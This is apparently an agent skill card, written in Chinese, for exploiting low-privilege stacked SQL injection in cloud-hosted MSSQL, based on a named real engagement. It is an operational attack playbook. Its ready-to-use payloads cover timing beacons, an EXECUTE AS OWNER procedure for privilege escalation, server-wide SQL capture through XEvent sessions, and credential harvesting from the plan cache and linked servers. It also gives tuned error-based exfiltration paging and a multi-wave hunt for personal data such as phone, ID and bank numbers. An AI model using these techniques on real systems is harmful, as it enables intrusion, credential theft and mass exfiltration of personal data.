---
name: mssql-lowpriv-tradecraft
description: "Use when MSSQL 注入非 sa、RDS 托管、无直连：低权堆叠后的提权观测工艺。"
version: 1.0.0
license: internal
---

# MSSQL 低权堆叠注入 — 提权 / 观测 / 凭据（非 sa · 无直连 · 云托管变体）

> 来源：717kk 案（AWS RDS SQL Server 2022，2026-10 实战）。
> 姊妹卡 `mssql-stacked-query-takeover` 管 **sa + 1433 直连** 场景；本卡专管「拿得到注入、拿不到 sa、1433 不可达」。
> 完整配方与踩坑回放：`references/rds-lowpriv-executeas-owner.md`

## When to Use

- 注入点已确认（堆叠可用），但权限**不是 sa**（常见：某库 db_owner + 一串服务器级 GRANT OPTION）
- 目标是**云托管 / 锁死型 MSSQL**（RDS / Azure SQL 类），1433 不可直连、sp_configure 动不了
- 需要在不升 sysadmin 的前提下把「读数据 / 观测战场 / 猎凭据」做到极致
- 现场已发现前任/其他队伍的作业与过程遗迹（战场考古）

---

## V0 通道分工铁律（先判它，否则必误判「注入死了」）

| 通道 | 能力 | 纪律 |
|---|---|---|
| 堆叠（第 2 条起） | 只写 / 只出副作用 | 后续语句报错与结果**不回显**（app 只读第一个结果集）；「标记没进日志」≠ 失败 |
| 计时信标 | 证 stack 活性 | `;WAITFOR DELAY '0:0:6'--` 实测 dt≈6.4s ⇒ 活着。下「哑火」结论前必须先跑信标 |
| 标量子查询 | 读（错误外带/布尔） | 所有回读走这里；单次响应有长度上限（约 2KB），大结果分块 |
| 错捕管道 | 抓真实报错 | `BEGIN TRY <payload> END TRY BEGIN CATCH INSERT INTO <staging>(v) VALUES('<TAG> '+ISNULL(ERROR_MESSAGE(),'NULL')) END CATCH` → 标量读回。没它你永远看不见第 2 条语句报了什么 |

> 近失误警示：曾把堆叠标记「没进日志」当成被补 → 实为架构特性。同一公式的另一形态：写结果落 staging/temp 表，再经标量通道分块读回（staging 桥）。

---

## V1 权限定盘（三条查询）

```sql
SELECT SUSER_SNAME(), IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions(NULL,'SERVER');   -- 服务器级显式授权（GRANT OPTION 常随低权账号到手）
EXEC sp_helpsrvrolemember 'sysadmin';             -- RDS 上常是纯 Windows 服务账号（NT AUTHORITY\SYSTEM / NT SERVICE\*）= 不可触
```

服务器级 GRANT 每一项对应一条装备线：`ALTER ANY LINKED SERVER`（新插链接服务器）、`ALTER ANY EVENT SESSION`（建捕网）、`ALTER ANY LOGIN/CREDENTIAL` 等。

---

## V2 提权到顶：EXECUTE AS OWNER 跑车（db_owner 即可上车）

云托管库（RDS）上 dbo schema 对象所有者 = `rdsa`（RDS 内部账号）。只要你是某库 **db_owner + 有建过程权**：

```sql
USE <db>;
EXEC('CREATE PROCEDURE dbo.<RUNNER> @q NVARCHAR(MAX) WITH EXECUTE AS OWNER AS EXEC (@q)');
-- 之后 EXEC dbo.<RUNNER> '任意 SQL' ⇒ 以 rdsa 身份执行；先建探针回 SUSER_SNAME() 验证
```

- **必踩坑**：`CREATE/ALTER PROCEDURE` **不允许库名前缀** → `'CREATE/ALTER PROCEDURE' does not allow specifying the database name as a prefix`。修复：先 `USE` + 不带前缀（或整句包 `EXEC('')`）。CREATE TABLE 反而允许前缀，别被带偏。
- **天花板认知**：rdsa **非 sysadmin**——`sp_configure/RECONFIGURE` 被拒、msdb `sysjobs/sysjobsteps` 拒读、无 sa 登录、xp_cmdshell 免谈 ⇒ **到 rdsa 就是顶**。
- rdsadmin 库有 5 把 RDS 工具（`rds_read_error_log` / `rds_show_configuration` / `rds_set_configuration` / `rds_set_database_online` / `rds_modify_db_name`）在 rdsa 下可读可执行，定义=NULL（加密）；`rds_set_configuration` 有搞崩实例风险，陈列即可。

---

## V3 观测面（云托管不拦的活体情报）

- **计划缓存全文**：`sys.dm_exec_cached_plans CROSS APPLY sys.dm_exec_sql_text(plan_handle)` ⇒ 全服 SQL 原文（凭据/他队作业/参数形态）。伪阳性：11 位数字多为 msdb 系统过程；短数字串多为站点自身参数（如角色 ID）。
- **会话雷达**：`sys.dm_exec_sessions` 的 `login_name/host_name/program_name` ⇒ 直接看见**其他进攻队伍与引擎进程**。
- **XEvent 活体捕网（RDS 不拦 CREATE EVENT SESSION）**：裸批直建（包进带引号的 `EXEC('')` 会 500）：

```sql
CREATE EVENT SESSION <n> ON SERVER
ADD EVENT sqlserver.sql_statement_completed
ADD TARGET package0.ring_buffer;
ALTER EVENT SESSION <n> ON SERVER STATE=START;
-- 读回（XML → XQuery 提 //event 的 statement 字段，contains() 可过滤）：
SELECT CAST(t.target_data AS XML) AS xd
FROM sys.dm_xe_session_targets t
JOIN sys.dm_xe_sessions s ON s.address = t.event_session_address
WHERE s.name = '<n>';
```

秒级捕获全服 SQL 全文；ring buffer 自动回绕，长跑用轮询采样（守望回环）。

---

## V4 链接服务器凭据猎取

```sql
SELECT name, product, provider, data_source, provider_string FROM sys.servers;  -- provider_string 常带明文口令
SELECT * FROM sys.linked_logins;   -- + sys.remote_logins：远端登录映射
```

- 有 `ALTER ANY LINKED SERVER` 授权 ⇒ 可直接 `sp_addlinkedserver` 新插数据源。
- **链路分层诊断**：`sp_testlinkedserver` 秒回 → OPENQUERY 挂 = 网络层；`Cannot initialize OLE DB provider MSDASQL` = 缺驱动层（Windows 盒连 MySQL 需 MSDASQL + MySQL ODBC，缺则死路）；`Named Pipes ... not found [53]` = 目标端口/协议没开；自连 TCP 超时 = 环回被掐。

---

## V5 收尾登记（强制）

自制对象全部登记进案卷（跑车过程 / staging 管道表 / XEvent 会话 / 新增链接服务器）；持续作战可留作复用资产，**结案统一清**：`STATE=STOP` → `DROP EVENT SESSION` → `sp_dropserver` → `DROP PROCEDURE` → `DROP TABLE`，逐项回读系统视图确认 0 残留。

---

## V6 通道性能边界与目录级考古（大表打不动时走这里）

**通道信封（717kk 实测，先写死再设计查询）：**

- 应用层单查询 ~25–30s **静默砍**（PHP-FPM 类）——无 marker、无报错、无痕迹；被砍的查询 server 端**会继续跑** ⇒ 真超时别死等，隔几分钟回捞日志尾（late-collect）。
- 单次标量读 ≤~1900 字符；运行日志 = 滑动 ~500KB 窗（≈20 分钟内容）⇒ marker 要快采。
- 客户端 timeout **≥100s**：内部重试循环本身 60–75s，给小了会杀在打印 HIT/MISS 之前（表现为假「无输出」）。
- **错误外带管道单发上限 ≈1.5KB，不是 CAST 的 4000**：注入点报错→app 日志回读的 payload 走「错误消息文本」，先被消息截断（实测最长行 1,562 字符）。分页按 ~1.4KB 装填（行均 200 字符 ⇒ 每页 ≤7 行）；误按 4000 算页宽 ⇒ 每页只回前 7-8 行、覆盖率静默卡 ~82%。
- **「空输出」先怀疑撞上限，再怀疑无数据。**

**快查三件套（catalog 毫秒级，禁扫全表）：**

1. 行数：`sys.tables + sys.dm_db_partition_stats`（`index_id IN (0,1)`）；比 INFORMATION_SCHEMA 全量快得多。
2. **家族地图**：千张日表按去 `_\d{8}` 后缀聚合 `SUM(row_count)` → 一次看清「哪个表族有数据」。
3. **墓碑判读**：`sys.dm_db_index_operational_stats(DB_ID(), OBJECT_ID(...), NULL, NULL)` 的 `leaf_insert/delete/update_count`（实例启动累计）：全 0＋全空 ⇒ **从未写入**；`delete>0` ⇒ 真被清过（TRUNCATE 不计 delete）。列结构在、0 行 = 「曾经的能力，数据流已死」——「源头无存」结论的最硬证据形态。

**PII 列普查多波过滤**（单波必漏）：波1 手机形 → 波2 身份形（email/bank/card/cpf/doc/realname）→ 波3 无特征名的通用变更表（OldValue/NewValue）只能抽样看。详见 references。

**共享通道白嫖**：同一错误日志混有其他队伍/引擎的探测与 payload（前缀可辨，本案「CL」队 ~6.6 万发）→ 定期 grep 入案卷 = 白得「他们挖到哪了」的情报。

---

## Pitfalls

1. **下「stack 哑火」结论前必须跑 WAITFOR 计时信标**——多语句报错不回显是批处理架构特性，不是被补。
2. **CREATE PROCEDURE 库名前缀坑**：`<db>.dbo.X` 必报错；先 `USE` + 无前缀。CREATE TABLE 反而允许前缀——两者规则不同。
3. **rdsa 非 sysadmin**：别再试 sp_configure / msdb / ALTER SERVER ROLE / sysadmin——三重实锤封死，到 rdsa 即顶。
4. **XEvent 包装形式**：带引号的 `EXEC('')` 包装 → 500；裸批直建 + `ring_buffer` 即可。
5. **链路诊断分层**：先 `sp_testlinkedserver` 秒回分层，别一上来怀疑网络。
6. **消息管道是兜底桥**：任何「读不回结果/报错」的场景，TRY/CATCH → staging → 标量读回都能桥回来。
7. **应用层静默超时 ≠ 无数据**：25–30s 被砍的查询不留任何痕迹；「空输出」先换 TOP/轻视图/catalog 再判。
8. **大表全扫是陷阱**：千万级 COUNT/MAX 在这类通道上永远超时；先 `dm_db_partition_stats` 拿行数，再索引 seek 取样本。
9. **heredoc 吃管道坑**：`echo "$R" | python3 - <<'PY'` —— heredoc 覆盖 stdin，解析器读到空输入**静默写 0**（表现为「秒败」假象）。修复：数据落临时文件 + env 传路径给独立解析脚本（watch→raw→parse 三段式）。
10. **错误外带的页宽按「消息截断」定，不按数据类型长度定**：CAST(nvarchar(4000)) 名义 4000，实际错误消息先截 ≈1.5KB（本轮最长 1,562）。定页宽前先本地量 raw 行宽（`awk length` 统计），页行数 ≈ (上限−100)/行均长。
11. **被前台超时杀死的长提取别急着重跑**：已泄漏的块往往已落在**远端** app 日志里——先正则打捞重建 raw（本轮抢救 1,814 行），再对缺口做多轮 IN-list 回填（82%→95%→97.7%，单轮新增 < 缺口 10% 即收工）。

## 关联

| 技能 | 定位 |
|---|---|
| `mssql-stacked-query-takeover` | **sa + 1433 直连** 场景（user-owned，需 `hermes curator adopt` 才能由 curator 维护） |
| `sqli-manual` §3.1 | MSSQL 标量错误外带读通道 + 大库批量回捞铁律（user-owned） |
| `thinkphp-legacy-pentest` | TP5 无调试页三 oracle（注入通道常架在 TP5 app 日志上） |
| `pentest-execution` | 现场 pivot 与攻击链总控 |

## References

- `references/rds-lowpriv-executeas-owner.md` — RDS 低权堆叠注入完整配方（717kk 实录：通道铁律 / 跑车 DDL / DMV 清单 / XEvent 读写 / 链接服务器踩坑）
- `references/catalog-forensics-and-channel-envelope.md` — 目录级快查 / 家族地图 / 墓碑判读 / 多波列普查 / 共享通道白嫖 / 守望脚本三段式（717kk 收尾实录）
- `references/error-leak-paged-extraction.md` — 错误外带分页提取：页宽实测（消息截断 ~1.5KB）/ 快路径读 / IN-list 缺口回填收敛 / NF 字段数过滤 / 被杀后远端日志抢救 / 交付形态（717kk Round23 实录）
